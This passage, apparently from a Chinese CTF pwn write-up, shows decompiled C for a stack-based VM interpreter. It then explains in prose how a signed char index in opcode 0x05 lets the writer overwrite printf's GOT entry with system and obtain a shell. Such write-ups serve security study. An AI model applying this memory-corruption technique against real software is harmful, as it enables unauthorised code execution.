class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+29h] [rbp-27h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+2Dh] [rbp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+2Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+2Fh] [rbp-21h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+31h] [rbp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+35h] [rbp-1Bh]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+36h] [rbp-1Ah]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v22; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v23; <span class="comment">// [rsp+39h] [rbp-17h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v25 = *(_BYTE *)(i + a2);</span><br><span class="line">    <span class="keyword">switch</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(++i + a2));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        v7 = sub_1254(a1);</span><br><span class="line">        v6 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v7 + v6));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v9 = sub_1254(a1);</span><br><span class="line">        v8 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v9 - v8));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        v3 = *(<span class="type">char</span> *)(++i + a2);</span><br><span class="line">        *(_BYTE *)(a1 + v3) = sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(a1 + *(<span class="type">char</span> *)(++i + a2)));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        --*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v11 = sub_1254(a1);</span><br><span class="line">        v10 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v10 * v11));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xAu</span>:</span><br><span class="line">        v13 = sub_1254(a1);</span><br><span class="line">        v12 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v13 / v12));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBu</span>:</span><br><span class="line">        v15 = sub_1254(a1);</span><br><span class="line">        v14 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v15 % v14));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xCu</span>:</span><br><span class="line">        v17 = sub_1254(a1);</span><br><span class="line">        v16 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v16 &amp; v17));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xDu</span>:</span><br><span class="line">        v19 = sub_1254(a1);</span><br><span class="line">        v18 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v18 | v19));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xEu</span>:</span><br><span class="line">        v21 = sub_1254(a1);</span><br><span class="line">        v20 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v20 ^ v21));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFu</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) = ~*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10u</span>:</span><br><span class="line">        v22 = *(_BYTE *)(i + <span class="number">1</span> + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v22 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i = v22 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x11u</span>:</span><br><span class="line">        v23 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; !*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v23 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12u</span>:</span><br><span class="line">        v24 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v24 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unknown opcode: 0x%02X\n&quot;</span>, v25);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过逆向，主要有用的命令码有：0x01将下一个字节压栈；0x03：加法（弹出栈顶两元素相加后压栈）；0x04：减法（弹出栈顶元素减次栈顶元素后压栈）；0x05：将栈顶值存到下一字节索引处<br>选项0x05中的索引值类型为char，如果我们写入0x80，即128超出char的上限，0x80&#x3D;0b10000000，符号位是1被认定为负数的补码，还原后会得到-128，即-0x80，这时我们在ida里发现索引到-128处正好是printf的got表项，那么我们根据偏移关系（libc.sym[“system”]和libc.sym[“printf”]比对），就可以把printf的got表项改为system，最后把”sh”写入（一般写&#x2F;bin&#x2F;sh，这里图省事），便可以getshell。</p>]]></content>
      
      
      <categories>
          
          <category> CTF_pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
